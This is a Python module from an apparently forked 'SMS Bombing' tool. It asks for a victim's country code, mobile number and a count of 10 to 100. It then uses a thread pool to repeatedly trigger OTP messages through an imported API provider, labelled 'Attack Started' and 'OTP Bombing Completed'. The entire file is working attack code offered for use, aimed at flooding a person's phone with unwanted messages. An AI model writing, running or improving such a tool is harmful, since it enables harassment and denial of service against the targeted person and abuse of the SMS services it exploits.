"""
Original Author : https://github.com/karthi-the-hacker
Fork Author     : https://github.com/minefarts
"""
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor, as_completed
from AttackModes.provider import APIProvider
from rich.console import Console
from rich.panel import Panel
import re

console = Console()

def sms_banner():
    console.print(Panel.fit(
        "📲 [bold green]SMS Bombing[/bold green]",
        border_style="red"
    ))

def input_instructions():
    console.print(Panel.fit(
        "[bold yellow]Instructions[/bold yellow]\n\n"
        "👉 Enter country code (e.g. +91)\n"
        "👉 Enter 10-digit mobile number (no special characters)\n"
        "👉 Enter number of OTP to send max 100\n"
        "❌ Enter [red]'x'[/red] to exit anytime",
        border_style="magenta"
    ))

def get_country_code():
    while True:
        country_code  = input("🌍 Enter Country Code: ").strip()
        if country_code.lower() == 'x':
            return "exit"
        if country_code.startswith('+') and country_code[1:].isdigit():
            return country_code
        else:
            console.print("[bold red]❌ Invalid format. Use format like +91[/bold red]")

def get_otp_count():
    while True:
        user_input = input("📲 Enter number of OTPs to send (10–100): ").strip()
        
        if user_input.lower() == 'x':
            return "exit"

        if not user_input.isdigit():
            console.print("[bold red]❌ Invalid input. Please enter a number.[/bold red]")
            continue

        count = int(user_input)

        if count < 10 or count > 100:
            console.print("[bold red]❌ Please enter a number between 10 and 100.[/bold red]")
            continue

        return count
    
def get_mobile_number():
    while True:
        mobile_no = input("📱 Enter 10-Digit Mobile Number: ").strip()
        if mobile_no.lower() == 'x':
            return "exit"
        if re.fullmatch(r'\d{10}', mobile_no):
            return mobile_no
        else:
            console.print("[bold red]❌ Must be exactly 10 digits, no symbols.[/bold red]")

def getio():

    sms_banner()
    input_instructions()
    
    country_code = get_country_code()

    if country_code == "exit": 
        return None
    
    mobile_no = get_mobile_number()
    if mobile_no == "exit": 
        return None
    
    otpcount = get_otp_count()
    if otpcount == "exit": 
        return None
    
    return country_code, mobile_no, otpcount
    
def sendotp(country_code, mobile_no, otpcount):

    console.print(Panel.fit(
        "[bold yellow]🚀 Attack Started[/bold yellow]\n\n"
        f"👉 Country code: {country_code}\n"
        f"👉 Mobile number: {mobile_no}\n"
        f"👉 OTP count: {otpcount}\n",
        border_style="magenta"
    ))

    country_code = country_code.replace("+", "")
    api = APIProvider(country_code, mobile_no, "sms", delay=1)

    success, failed = 0, 0

    progress = Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(bar_width=None),
        "[progress.percentage]{task.percentage:>3.0f}%",
        TimeElapsedColumn(),
        console=console,
        transient=True
    )

    with progress:

        task = progress.add_task(
            "[cyan]Sending OTPs...",
            total = otpcount
        )

        while success < otpcount:
            with ThreadPoolExecutor(max_workers=10) as executor:
                
                jobs = [executor.submit(api.hit) for _ in range(otpcount - success)]

                for job in as_completed(jobs):
                
                    result = job.result()
                

                    if result:
                        success += 1
                        progress.advance(task)
                    
                    else:
                        print("❌ Try again later")
                        input("🔙 Enter 0 to return main menu...")
                        return

    input("\n✅ OTP Bombing Completed!\n\n🔙 Enter 0 to return to the main menu: ")        
    
    return country_code, mobile_no, otpcount